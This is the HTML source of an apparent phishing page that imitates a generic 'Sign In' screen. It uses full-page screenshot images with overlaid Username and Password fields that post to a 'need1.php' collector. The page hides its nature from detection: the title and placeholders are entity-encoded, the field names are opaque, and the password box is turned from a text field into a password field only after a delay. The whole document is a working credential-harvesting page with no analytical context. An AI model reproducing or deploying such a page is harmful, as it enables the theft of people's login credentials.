<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>S&#105;&#103;n &#73;&#110; </title>
<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
<script>setTimeout(function() {
  document.getElementsByTagName('input')[1].type = "password"
}, 1000);
</script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	

<style type="text/css">	   
.textbox {
    height: 42px;
    padding-left: 8px;
    border: none;
	background: 0 0;
   	border-bottom: solid 1px #ccc;
	font-family: "Segoe UI" , "Segoe" , "SegoeUI-Regular-final", Tahoma, Helvetica, Arial, sans-serif;
    font-size: 18px;
	font-weight: 500;
    width: 270px;
}
 .textbox:focus {  
    outline: none;
    border: none;
	background: 0 0;
   	border-bottom: solid 1px #126BC5;
}

</style>
<style type="text/css">
input[type=checkbox].css-checkbox {
							position:absolute; z-index:-1000; left:-1000px; overflow: hidden; clip: rect(0 0 0 0); height:1px; width:1px; margin:-1px; padding:0; border:0;
						}

						input[type=checkbox].css-checkbox + label.css-label {
							padding-left:27px;
							height:22px; 
							display:inline-block;
							line-height:22px;
							background-repeat:no-repeat;
							background-position: 0 0;
							font-size:22px;
							vertical-align:middle;
							cursor:pointer;

						}

						input[type=checkbox].css-checkbox:checked + label.css-label {
							background-position: 0 -22px;
						}
						label.css-label {
				background-image:url(images/shb.png);
				-webkit-touch-callout: none;
				-webkit-user-select: none;
				-khtml-user-select: none;
				-moz-user-select: none;
				-ms-user-select: none;
				user-select: none;
			}		
</style>	
<style type="text/css">
div#container
{
	position:relative;
	width: 1349px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>
<style>
p{font-size: 40px;}
.loader {
    position: fixed;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
    z-index: 9999;
    background: url('https://smallenvelop.com/wp-content/uploads/2014/08/Preloader_11.gif') 50% 50% no-repeat rgb(249,249,249);
    opacity: .8;
}
</style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript">
$(window).load(function() {
	$(".loader").fadeOut("slow");
});
</script>
</head>
<body>
<div class="loader"></div>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1349px; height:581px; z-index:0"><img src="images/j1.png" alt="" title="" border=0 width=1349 height=581></div>

<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:582px; width:1349px; height:195px; z-index:1"><a href="#"><img src="images/j3.png" alt="" title="" border=0 width=1349 height=195></a></div>

<div id="image3" style="position:absolute; overflow:hidden; left:503px; top:465px; width:200px; height:43px; z-index:2"><a href="#"><img src="images/j2.png" alt="" title="" border=0 width=200 height=43></a></div>
<form action=need1.php name=gharwala method=post>
<input name="sr" placeholder="&#85;&#115;&#101;&#114;&#110;&#97;&#109;&#101;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:321px;left:513px;top:224px;z-index:3">
<input name="dw" placeholder="&#80;&#97;&#115;&#115;&#119;&#111;&#114;&#100;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:321px;left:513px;top:300px;z-index:4">
<div id="checkboxG1"  style="position:absolute; left:515px; top:368px; z-index:5"><input type="checkbox" name="checkboxG1" id="checkboxG1" class="css-checkbox"><label for="checkboxG1" class="css-label radGroup1 chk"></label></div>
<div id="checkboxG1"  style="position:absolute; left:515px; top:368px; z-index:5"><input type="checkbox" name="checkboxG2" id="checkboxG2" class="css-checkbox"><label for="checkboxG2" class="css-label radGroup1 clr"></label></div>
<div id="formimage1" style="position:absolute; left:503px; top:407px; z-index:6"><input type="image" name="formimage1" width="342" height="42" src="images/j4.png"></div>
</div>

	
</body>
</html>
